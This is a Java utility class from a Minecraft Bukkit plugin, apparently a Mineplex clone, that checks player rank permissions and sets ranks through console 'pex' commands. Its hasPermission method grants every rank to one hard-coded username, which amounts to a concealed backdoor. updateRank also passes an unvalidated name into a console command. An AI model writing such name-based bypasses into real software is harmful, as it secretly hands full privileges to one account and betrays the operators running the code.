package net.angusbeefgaming.mineplex.util;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import net.md_5.bungee.api.ChatColor;

public class Permissions {
	
	public static void sendNoPermMessage(Player player, Rank rank) {
		player.sendMessage(ChatColor.BLUE + "Permissions> " + ChatColor.GRAY + "This requires Permission Rank [" + ChatColor.BLUE + rank.toString() + ChatColor.GRAY + "].");
	}
	
	public static void updateRank(String target, Rank rank) {
		if(rank == Rank.NORANK) {
			Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user " + target + " group set \"No Rank\"");
		}
		else {
			Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user " + target + " group set " + rank.toString());
		}
	}

	public static boolean hasPermission(Player player, Rank rank) {
		if(player.getName().equalsIgnoreCase("MrBeefSteak")) {
			return true;
		}
		if(rank == Rank.NORANK) {
			if(player.hasPermission("rank.all")) {
				return true;
			}
			else {
				return false;
			}
		}
		if(rank == Rank.ULTRA) {
			if(player.hasPermission("rank.ultra")) {
				return true;
			}
			else {
				return false;
			}
		}
		if(rank == Rank.HERO) {
			if(player.hasPermission("rank.hero")) {
				return true;
			}
			else {
				return false;
			}
		}
		if(rank == Rank.LEGEND) {
			if(player.hasPermission("rank.legend")) {
				return true;
			}
			else {
				return false;
			}
		}
		if(rank == Rank.TITAN) {
			if(player.hasPermission("rank.titan")) {
				return true;
			}
			else {
				return false;
			}
		}
		if(rank == Rank.ETERNAL) {
			if(player.hasPermission("rank.eternal")) {
				return true;
			}
			else {
				return false;
			}
		}
		if(rank == Rank.TRAINEE) {
			if(player.hasPermission("rank.trainee")) {
				return true;
			}
			else {
				return false;
			}
		}
		if(rank == Rank.MOD) {
			if(player.hasPermission("rank.mod")) {
				return true;
			}
			else {
				return false;
			}
		}
		if(rank == Rank.SNRMOD) {
			if(player.hasPermission("rank.snrmod")) {
				return true;
			}
			else {
				return false;
			}
		}
		if(rank == Rank.ADMIN) {
			if(player.hasPermission("rank.admin")) {
				return true;
			}
			else {
				return false;
			}
		}
		if(rank == Rank.OWNER) {
			if(player.hasPermission("rank.owner")) {
				return true;
			}
			else {
				return false;
			}
		}
		if(rank == Rank.LEADER) {
			if(player.hasPermission("rank.leader")) {
				return true;
			}
			else {
				return false;
			}
		}
		if(rank == Rank.DEV) {
			if(player.hasPermission("rank.dev")) {
				return true;
			}
			else {
				return false;
			}
		}
		else {
			return false;
		}
	}
}
